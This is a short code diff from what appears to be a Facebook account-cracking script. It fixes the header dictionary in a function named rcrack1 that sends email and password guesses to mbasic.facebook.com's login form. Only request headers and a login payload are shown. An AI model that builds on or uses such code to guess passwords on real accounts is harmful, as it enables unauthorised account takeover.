@@ -209,7 +209,9 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            "header_freefb = {'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            'method': 'GET',
+            'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-language': 'en-GB,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-US;q=0.6',
             'cache-control': 'max-age=0',
